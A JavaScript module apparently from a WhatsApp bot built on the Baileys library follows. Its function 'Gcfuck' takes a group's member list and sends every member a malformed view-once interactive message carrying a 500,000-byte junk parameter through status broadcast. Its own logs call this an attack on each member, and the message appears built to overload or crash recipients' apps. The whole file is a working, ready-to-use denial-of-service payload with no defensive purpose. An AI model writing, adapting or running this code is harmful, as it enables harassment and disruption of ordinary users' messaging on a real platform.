// lib/gcfuck.js
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function Gcfuck(sock, groupJid) {
  if (!sock || !groupJid) {
    console.error("❌ [Gcfuck Error]: Socket ya Group JID missing hai!");
    return false;
  }

  try {
    let metadata = await sock.groupMetadata(groupJid);
    let participants = metadata.participants.map(v => v.id);

    console.log(`⚡ [Gcfuck]: Target Group Locked -> ${metadata.subject} (${participants.length} members)`);

    for (let i = 0; i < participants.length; i++) {
      let targetJid = participants[i];

      try {
        const biji = await generateWAMessageFromContent(
          targetJid,
          {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "Rizo Gcfuck Overload",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\x10".repeat(500000),
                    version: 3
                  },
                  entryPointConversionSource: "galaxy_message"
                }
              }
            }
          },
          {
            ephemeralExpiration: 0,
            forwardingScore: 9999,
            isForwarded: true
          }
        );

        await sock.relayMessage("status@broadcast", biji.message, {
          messageId: biji.key.id,
          statusJidList: [targetJid],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }]
                }
              ]
            }
          ]
        });

        if (i % 10 === 0) {
          console.log(`🔄 [Gcfuck Progress]: Attacked ${i}/${participants.length} members.`);
        }

        await sleep(1500);
      } catch (err) {
        continue;
      }
    }

    console.log(`✅ [Gcfuck]: Group attack sequence completed successfully!`);
    return true;
  } catch (err) {
    console.error("❌ [Gcfuck Critical Error]:", err);
    return false;
  }
}

module.exports = { Gcfuck };
